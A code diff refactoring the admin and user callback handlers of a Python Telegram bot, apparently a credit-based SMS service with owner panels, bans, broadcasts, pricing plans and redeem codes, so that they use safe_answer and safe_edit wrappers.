-        await cq.answer("❌ Max 6!", show_alert=True)
+        await safe_answer(cq, "❌ Max 6!", show_alert=True)
         return
     await state.set_state(S.add_owner)
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_CROWN, '👑')} <b>Add Super Admin</b>\n\nSuper Admin Chat ID bhejo:",
-        reply_markup=kb([(f"{sc('cancel')}", "owner:owners:menu")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", "owner:owners:menu")])
     )
 
 @R.message(S.add_owner)
@@ -2508,45 +2533,42 @@ async def owner_owners_del(cq: CallbackQuery, state: FSMContext):
     uid = cq.from_user.id
     del_id = int(cq.data.split("owner:owners:del:", 1)[1])
     if not is_owner(uid, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     if del_id == MAIN_OWNER or del_id in SUPER_ADMINS:
-        await cq.answer("❌ Main owner / Hardcoded Super Admin remove nahi ho sakta!", show_alert=True)
+        await safe_answer(cq, "❌ Main owner / Hardcoded Super Admin remove nahi ho sakta!", show_alert=True)
         return
     if del_id in d["owners"]:
         d["owners"].remove(del_id)
         save(d)
-        await cq.answer("🗑 Removed!")
-    await cq.message.edit_text(
+        await safe_answer(cq, "🗑 Removed!")
+    await safe_edit(cq.message,
         f"{em(EMOJI_CROWN, '👑')} <b>Owners</b>\n\nTotal: <b>{len(d['owners'])}/6</b>",
-        reply_markup=owners_menu_kb(d),
-        parse_mode="HTML"
+        reply_markup=owners_menu_kb(d)
     )
 
 @R.callback_query(F.data == "owner:admins:menu")
 async def owner_admins_menu(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     admins = d.get("admins", [])
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>\n\nTotal: <b>{len(admins)}</b>",
-        reply_markup=admins_menu_kb(d),
-        parse_mode="HTML"
+        reply_markup=admins_menu_kb(d)
     )
 
 @R.callback_query(F.data == "owner:admins:add")
 async def owner_admins_add_start(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     await state.set_state(S.add_admin)
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_SHIELD, '🛡')} <b>Add Admin</b>\n\nTelegram User ID bhejo:",
-        reply_markup=kb([(f"{sc('cancel')}", "owner:admins:menu")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", "owner:admins:menu")])
     )
 
 @R.message(S.add_admin)
@@ -2582,16 +2604,15 @@ async def owner_admins_del(cq: CallbackQuery, state: FSMContext):
     uid = cq.from_user.id
     del_id = int(cq.data.split("owner:admins:del:", 1)[1])
     if not is_owner(uid, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     if del_id in d.get("admins", []):
         d["admins"].remove(del_id)
         save(d)
-        await cq.answer("🗑 Removed!")
-    await cq.message.edit_text(
+        await safe_answer(cq, "🗑 Removed!")
+    await safe_edit(cq.message,
         f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>\n\nTotal: <b>{len(d['admins'])}</b>",
-        reply_markup=admins_menu_kb(d),
-        parse_mode="HTML"
+        reply_markup=admins_menu_kb(d)
     )
 
 @R.callback_query(F.data.in_({"owner:free:on", "owner:free:off"}))
@@ -2599,16 +2620,14 @@ async def owner_free_toggle(cq: CallbackQuery, state: FSMContext):
     await state.clear()
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     d["free_mode"] = (cq.data == "owner:free:on")
     save(d)
     d = load()
     mode = "🟢 FREE MODE ON" if d["free_mode"] else "🔴 Approval Required"
-    await cq.answer(f"Done! {mode}", show_alert=True)
-    try:
-        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
-    except TelegramBadRequest: pass
+    await safe_answer(cq, f"Done! {mode}", show_alert=True)
+    await safe_edit(cq.message, owner_panel_text(d), reply_markup=owner_kb(d))
 
 @R.callback_query(F.data.in_({"owner:users:list", "admin:users:list"}))
 async def panel_users_list(cq: CallbackQuery, state: FSMContext):
@@ -2616,36 +2635,35 @@ async def panel_users_list(cq: CallbackQuery, state: FSMContext):
     uid = cq.from_user.id
     prefix = "owner" if is_owner(uid, d) else "admin"
     if not is_admin(uid, d):
-        await cq.answer("🚫 Access Denied!", show_alert=True)
+        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
         return
     text, markup = users_list_kb(d, prefix, 0)
-    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")
+    await safe_edit(cq.message, text, reply_markup=markup)
 
 @R.callback_query(F.data.regexp(r"^(owner|admin):users:pg:(\d+)$"))
 async def panel_users_page(cq: CallbackQuery, state: FSMContext):
     d = load()
     uid = cq.from_user.id
     if not is_admin(uid, d):
-        await cq.answer("🚫 Access Denied!", show_alert=True)
+        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
         return
     parts = cq.data.split(":")
     prefix = parts[0]
     page = int(parts[3])
     text, markup = users_list_kb(d, prefix, page)
-    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")
+    await safe_edit(cq.message, text, reply_markup=markup)
 
 @R.callback_query(F.data.in_({"owner:ban", "admin:ban"}))
 async def panel_ban_start(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_admin(cq.from_user.id, d):
-        await cq.answer("🚫 Access Denied!", show_alert=True)
+        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
         return
     await state.set_state(S.ban_user)
     back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_CROSS, '🚫')} <b>Ban User</b>\n\nUser ka Telegram ID bhejo:",
-        reply_markup=kb([(f"{sc('cancel')}", back)]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", back)])
     )
 
 @R.message(S.ban_user)
@@ -2682,17 +2700,16 @@ async def panel_ban_done(msg: Message, state: FSMContext):
 async def panel_unban_menu(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_admin(cq.from_user.id, d):
-        await cq.answer("🚫 Access Denied!", show_alert=True)
+        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
         return
     banned = d.get("banned", [])
     if not banned:
-        await cq.answer("✅ Koi banned nahi!", show_alert=True)
+        await safe_answer(cq, "✅ Koi banned nahi!", show_alert=True)
         return
     prefix = "owner" if is_owner(cq.from_user.id, d) else "admin"
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_CHECK, '🔓')} <b>Unban User</b>\n\nBanned: <b>{len(banned)}</b>",
-        reply_markup=unban_menu_kb(d, prefix),
-        parse_mode="HTML"
+        reply_markup=unban_menu_kb(d, prefix)
     )
 
 @R.callback_query(F.data.regexp(r"^(owner|admin):unban:do:(\d+)$"))
@@ -2700,16 +2717,16 @@ async def panel_unban_do(cq: CallbackQuery, state: FSMContext):
     d = load()
     uid = cq.from_user.id
     if not is_admin(uid, d):
-        await cq.answer("🚫 Access Denied!", show_alert=True)
+        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
         return
     ban_id = int(cq.data.split(":")[-1])
     if ban_id in d.get("banned", []):
         d["banned"].remove(ban_id)
         save(d)
-    await cq.answer(f"✅ {ban_id} unban ho gaya!", show_alert=True)
+    await safe_answer(cq, f"✅ {ban_id} unban ho gaya!", show_alert=True)
     back_text = owner_panel_text(d) if is_owner(uid, d) else admin_panel_text(d)
     back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
-    await cq.message.edit_text(back_text, reply_markup=back_kb, parse_mode="HTML")
+    await safe_edit(cq.message, back_text, reply_markup=back_kb)
     try:
         await cq.bot.send_message(ban_id, f"{em(EMOJI_CHECK, '✅')} Aapka ban hata diya gaya. /start karein.", parse_mode="HTML")
     except: pass
@@ -2718,14 +2735,13 @@ async def panel_unban_do(cq: CallbackQuery, state: FSMContext):
 async def panel_broadcast_start(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_admin(cq.from_user.id, d):
-        await cq.answer("🚫 Access Denied!", show_alert=True)
+        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
         return
     await state.set_state(S.broadcast)
     back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\nJo message bhejni hai woh type karo:",
-        reply_markup=kb([(f"{sc('cancel')}", back)]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", back)])
     )
 
 @R.message(S.broadcast)
@@ -2752,7 +2768,9 @@ async def panel_broadcast_do(msg: Message, state: FSMContext):
         except Exception:
             fail += 1
         await asyncio.sleep(0.05)
-    await wait.delete()
+    try:
+        await wait.delete()
+    except: pass
     back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
     await msg.answer(
         f"{em(EMOJI_CHECK, '✅')} <b>Broadcast Done!</b>\n\n{em(EMOJI_CHECK, '✅')} Delivered: <b>{ok}</b>\n{em(EMOJI_CROSS, '❌')} Failed: <b>{fail}</b>",
@@ -2764,42 +2782,40 @@ async def panel_broadcast_do(msg: Message, state: FSMContext):
 async def owner_export_script(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
-    await cq.answer("📤 Exporting...")
+    await safe_answer(cq, "📤 Exporting...")
     try:
         script_path = os.path.abspath(__file__)
         if not os.path.exists(script_path):
             script_path = _DATA_FILE.replace(".json", ".py")
             if not os.path.exists(script_path):
-                script_path = "blast_bot_v3.2_premium.py"
+                script_path = "app.py"
         await cq.message.reply_document(
             document=FSInputFile(script_path),
             caption=f"{em(EMOJI_GEAR, '📤')} <b>Script Export</b> — <i>{_VERSION}</i>",
             parse_mode="HTML"
         )
     except Exception as e:
-        await cq.answer(f"❌ Export failed: {str(e)[:40]}", show_alert=True)
+        await safe_answer(cq, f"❌ Export failed: {str(e)[:40]}", show_alert=True)
 
 @R.callback_query(F.data.in_({"admin:home", "admin:refresh"}))
 async def admin_home(cq: CallbackQuery, state: FSMContext):
     await state.clear()
     d = load()
     if not is_admin(cq.from_user.id, d):
-        await cq.answer("🚫 Admin Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Admin Only!", show_alert=True)
         return
-    try:
-        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
-    except TelegramBadRequest: pass
+    await safe_edit(cq.message, admin_panel_text(d), reply_markup=admin_kb(d))
 
 @R.callback_query(F.data == "admin:stats")
 async def admin_stats_cb(cq: CallbackQuery, state: FSMContext):
     await state.clear()
     d = load()
     if not is_admin(cq.from_user.id, d):
-        await cq.answer("🚫 Admin Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Admin Only!", show_alert=True)
         return
-    await cq.answer("⏳ Fetching...")
+    await safe_answer(cq, "⏳ Fetching...")
 
     current_fb_ids = {fb["id"] for fb in d.get("firebases", [])}
     global CACHED_DEVICES, FB_DEVICE_COUNTS
@@ -2823,20 +2839,16 @@ async def admin_stats_cb(cq: CallbackQuery, state: FSMContext):
     if len(full) > 4000:
         full = full[:3990] + "\n<i>...truncated</i>"
 
-    await cq.message.edit_text(
-        full,
-        reply_markup=kb([
-            (f"{sc('refresh')}", "admin:stats"),
-            (f"{sc('back')}", "admin:home")
-        ]),
-        parse_mode="HTML"
-    )
+    await safe_edit(cq.message, full, reply_markup=kb([
+        (f"{sc('refresh')}", "admin:stats"),
+        (f"{sc('back')}", "admin:home")
+    ]))
 
 @R.callback_query(F.data == "owner:fj:menu")
 async def owner_fj_menu(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     fj = d.get("force_join", {})
     channels = fj.get("channels", [])
@@ -2856,22 +2868,21 @@ async def owner_fj_menu(cq: CallbackQuery, state: FSMContext):
         )],
         [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
     ]
-    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
+    await safe_edit(cq.message, text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
 
 @R.callback_query(F.data == "owner:fj:add")
 async def owner_fj_add_start(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     await state.set_state(S.fj_add_channel)
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_BELL, '🔗')} <b>Add Force Join Channel</b>\n\n"
         f"{sc('step 1/2')}: Channel/Group ka Telegram ID bhejo:\n"
         f"<i>Example: -1001234567890</i>\n\n"
         f"<b>Note:</b> Bot ko us channel/group mein admin hona chahiye.",
-        reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")])
     )
 
 @R.message(S.fj_add_channel)
@@ -2931,11 +2942,11 @@ async def owner_fj_add_link(msg: Message, state: FSMContext):
 async def owner_fj_remove_menu(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     channels = d.get("force_join", {}).get("channels", [])
     if not channels:
-        await cq.answer("❌ Koi channel nahi hai!", show_alert=True)
+        await safe_answer(cq, "❌ Koi channel nahi hai!", show_alert=True)
         return
 
     rows = []
@@ -2943,43 +2954,42 @@ async def owner_fj_remove_menu(cq: CallbackQuery, state: FSMContext):
         rows.append([btn(f"{ch.get('title', 'Channel')[:25]}", f"owner:fj:del:{ch['id']}", EMOJI_CROSS, "🗑")])
     rows.append([btn("ʙᴀᴄᴋ", "owner:fj:menu", EMOJI_GEAR, "🔙")])
 
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_CROSS, '🗑')} <b>Remove Channel</b>\n\nKaunsa channel hataana hai?",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
-        parse_mode="HTML"
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows)
     )
 
 @R.callback_query(F.data.startswith("owner:fj:del:"))
 async def owner_fj_del(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     ch_id = cq.data.split("owner:fj:del:", 1)[1]
     channels = d.get("force_join", {}).get("channels", [])
     d["force_join"]["channels"] = [c for c in channels if str(c["id"]) != ch_id]
     save(d)
-    await cq.answer("🗑 Channel removed!")
+    await safe_answer(cq, "🗑 Channel removed!")
     await owner_fj_menu(cq, state)
 
 @R.callback_query(F.data == "owner:fj:toggle")
 async def owner_fj_toggle(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     fj = d.setdefault("force_join", {})
     fj["enabled"] = not fj.get("enabled", False)
     save(d)
     status = "ENABLED" if fj["enabled"] else "DISABLED"
-    await cq.answer(f"Force Join {status}!", show_alert=True)
+    await safe_answer(cq, f"Force Join {status}!", show_alert=True)
     await owner_fj_menu(cq, state)
 
 @R.callback_query(F.data == "owner:pricing:menu")
 async def owner_pricing_menu(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     plans = d.get("pricing", {}).get("plans", [])
 
@@ -2992,19 +3002,18 @@ async def owner_pricing_menu(cq: CallbackQuery, state: FSMContext):
         [btn("ʀᴇᴍᴏᴠᴇ ᴘʟᴀɴ", "owner:pricing:remove", EMOJI_CROSS, "🗑")],
         [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
     ]
-    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
+    await safe_edit(cq.message, text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
 
 @R.callback_query(F.data == "owner:pricing:add")
 async def owner_pricing_add_start(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     await state.set_state(S.add_plan_name)
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_MONEY, '💳')} <b>Add Pricing Plan</b>\n\n{sc('step 1/4')}: Plan ka naam bhejo:\n<i>Example: Basic Plan</i>",
-        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")])
     )
 
 @R.message(S.add_plan_name)
@@ -3090,11 +3099,11 @@ async def owner_pricing_link(msg: Message, state: FSMContext):
 async def owner_pricing_remove(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     plans = d.get("pricing", {}).get("plans", [])
     if not plans:
-        await cq.answer("❌ Koi plan nahi hai!", show_alert=True)
+        await safe_answer(cq, "❌ Koi plan nahi hai!", show_alert=True)
         return
 
     rows = []
@@ -3102,30 +3111,29 @@ async def owner_pricing_remove(cq: CallbackQuery, state: FSMContext):
         rows.append([btn(f"{plan['name'][:25]}", f"owner:pricing:del:{plan['id']}", EMOJI_CROSS, "🗑")])
     rows.append([btn("ʙᴀᴄᴋ", "owner:pricing:menu", EMOJI_GEAR, "🔙")])
 
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_CROSS, '🗑')} <b>Remove Plan</b>\n\nKaunsa plan hataana hai?",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
-        parse_mode="HTML"
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows)
     )
 
 @R.callback_query(F.data.startswith("owner:pricing:del:"))
 async def owner_pricing_del(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     plan_id = cq.data.split("owner:pricing:del:", 1)[1]
     plans = d.get("pricing", {}).get("plans", [])
     d["pricing"]["plans"] = [p for p in plans if p["id"] != plan_id]
     save(d)
-    await cq.answer("🗑 Plan removed!")
+    await safe_answer(cq, "🗑 Plan removed!")
     await owner_pricing_menu(cq, state)
 
 @R.callback_query(F.data == "owner:redeem:menu")
 async def owner_redeem_menu(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     codes = d.get("redeem_codes", {})
 
@@ -3139,19 +3147,18 @@ async def owner_redeem_menu(cq: CallbackQuery, state: FSMContext):
         [btn("ᴅᴇʟᴇᴛᴇ ᴄᴏᴅᴇ", "owner:redeem:del", EMOJI_CROSS, "🗑")],
         [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
     ]
-    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
+    await safe_edit(cq.message, text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
 
 @R.callback_query(F.data == "owner:redeem:gen")
 async def owner_redeem_gen_start(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     await state.set_state(S.gen_redeem_credits)
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_GIFT, '🎁')} <b>Generate Redeem Code</b>\n\n{sc('step 1/2')}: Kitne credits dena hai?\n<i>Example: 50</i>",
-        reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")])
     )
 
 @R.message(S.gen_redeem_credits)
@@ -3216,11 +3223,11 @@ async def owner_redeem_uses(msg: Message, state: FSMContext):
 async def owner_redeem_del_menu(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     codes = d.get("redeem_codes", {})
     if not codes:
-        await cq.answer("❌ Koi code nahi hai!", show_alert=True)
+        await safe_answer(cq, "❌ Koi code nahi hai!", show_alert=True)
         return
 
     rows = []
@@ -3228,36 +3235,34 @@ async def owner_redeem_del_menu(cq: CallbackQuery, state: FSMContext):
         rows.append([btn(code, f"owner:redeem:deldo:{code}", EMOJI_CROSS, "🗑")])
     rows.append([btn("ʙᴀᴄᴋ", "owner:redeem:menu", EMOJI_GEAR, "🔙")])
 
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_CROSS, '🗑')} <b>Delete Redeem Code</b>",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
-        parse_mode="HTML"
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows)
     )
 
 @R.callback_query(F.data.startswith("owner:redeem:deldo:"))
 async def owner_redeem_del_do(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     code = cq.data.split("owner:redeem:deldo:", 1)[1]
     if code in d.get("redeem_codes", {}):
         del d["redeem_codes"][code]
         save(d)
-    await cq.answer("🗑 Code deleted!")
+    await safe_answer(cq, "🗑 Code deleted!")
     await owner_redeem_menu(cq, state)
 
 @R.callback_query(F.data == "owner:credits:add")
 async def owner_credits_add_start(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     await state.set_state(S.add_credits_uid)
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_MONEY, '💰')} <b>Add Credits</b>\n\n{sc('step 1/2')}: User ka Telegram ID bhejo:",
-        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", "owner:home")])
     )
 
 @R.message(S.add_credits_uid)
@@ -3314,13 +3319,12 @@ async def owner_credits_add_amount(msg: Message, state: FSMContext):
 async def owner_credits_deduct_start(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     await state.set_state(S.deduct_credits_uid)
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits</b>\n\n{sc('step 1/2')}: User ka Telegram ID bhejo:",
-        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", "owner:home")])
     )
 
 @R.message(S.deduct_credits_uid)
@@ -3383,7 +3387,7 @@ async def owner_credits_deduct_amount(msg: Message, state: FSMContext):
 async def owner_settings(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     settings = d.get("settings", {})
 
@@ -3397,19 +3401,18 @@ async def owner_settings(cq: CallbackQuery, state: FSMContext):
         [btn("sᴇᴛ ʀᴇғᴇʀʀᴀʟ ᴄʀᴇᴅɪᴛs", "owner:settings:ref", EMOJI_GIFT, "🎁")],
         [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
     ]
-    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
+    await safe_edit(cq.message, text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
 
 @R.callback_query(F.data == "owner:settings:ref")
 async def owner_settings_ref(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     await state.set_state(S.set_ref_credits)
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_GIFT, '🎁')} <b>Set Referral Credits</b>\n\nReferral pe kitne credits dena hai?\n<i>Example: 5</i>",
-        reply_markup=kb([(f"{sc('cancel')}", "owner:settings")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", "owner:settings")])
     )
 
 @R.message(S.set_ref_credits)
@@ -3439,7 +3442,7 @@ async def owner_settings_ref_done(msg: Message, state: FSMContext):
 async def owner_activity_log(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
 
     log_entries = d.get("activity_log", [])[-20:]
@@ -3455,20 +3458,16 @@ async def owner_activity_log(cq: CallbackQuery, state: FSMContext):
             lines.append(f"[{ts}] <code>{uid}</code> — <b>{action}</b> — {details}")
         text = "\n".join(lines)
 
-    await cq.message.edit_text(
-        text,
-        reply_markup=kb([
-            (f"{sc('refresh')}", "owner:activity"),
-            (f"{sc('back')}", "owner:home")
-        ]),
-        parse_mode="HTML"
-    )
+    await safe_edit(cq.message, text, reply_markup=kb([
+        (f"{sc('refresh')}", "owner:activity"),
+        (f"{sc('back')}", "owner:home")
+    ]))
 
 @R.callback_query(F.data == "owner:sms_history")
 async def owner_sms_history(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
 
     all_history = d.get("sms_history", {})
@@ -3477,11 +3476,7 @@ async def owner_sms_history(cq: CallbackQuery, state: FSMContext):
     text = f"{em(EMOJI_STAR, '📋')} <b>Global SMS History</b>\n\nTotal Records: <b>{total_entries}</b>\n\n"
     text += "<i>Per-user history unke Stats mein available hai.</i>"
 
-    await cq.message.edit_text(
-        text,
-        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
-        parse_mode="HTML"
-    )
+    await safe_edit(cq.message, text, reply_markup=kb([(f"{sc('back')}", "owner:home")]))
 
 @R.callback_query(F.data.in_({"user:home", "user:cancel"}))
 async def user_home(cq: CallbackQuery, state: FSMContext):
@@ -3491,34 +3486,33 @@ async def user_home(cq: CallbackQuery, state: FSMContext):
 
     joined, missing = await user_joined_all(cq.bot, uid, d)
     if not joined:
-        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
+        await safe_edit(cq.message, force_join_text(missing), reply_markup=force_join_kb(missing))
         return
 
     if is_owner(uid, d):
-        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
+        await safe_edit(cq.message, owner_panel_text(d), reply_markup=owner_kb(d))
         return
     if is_admin(uid, d):
-        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
+        await safe_edit(cq.message, admin_panel_text(d), reply_markup=admin_kb(d))
         return
     if not can_use(uid, d):
-        await cq.message.edit_text(f"{em(EMOJI_CROSS, '⛔')} Access nahi hai!", parse_mode="HTML")
+        await safe_edit(cq.message, f"{em(EMOJI_CROSS, '⛔')} Access nahi hai!")
         return
-    await cq.message.edit_text(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")
+    await safe_edit(cq.message, user_home_text(uid, d), reply_markup=user_kb())
 
 @R.callback_query(F.data == "user:credits")
 async def user_credits(cq: CallbackQuery, state: FSMContext):
     d = load()
     uid = cq.from_user.id
     credits = get_user_credits(uid, d)
-    await cq.answer(f"💰 Credits: {credits}\nOwner: {SUPER_ADMIN_NAME}", show_alert=True)
+    await safe_answer(cq, f"💰 Credits: {credits}\nOwner: {SUPER_ADMIN_NAME}", show_alert=True)
 
 @R.callback_query(F.data == "user:redeem")
 async def user_redeem_start(cq: CallbackQuery, state: FSMContext):
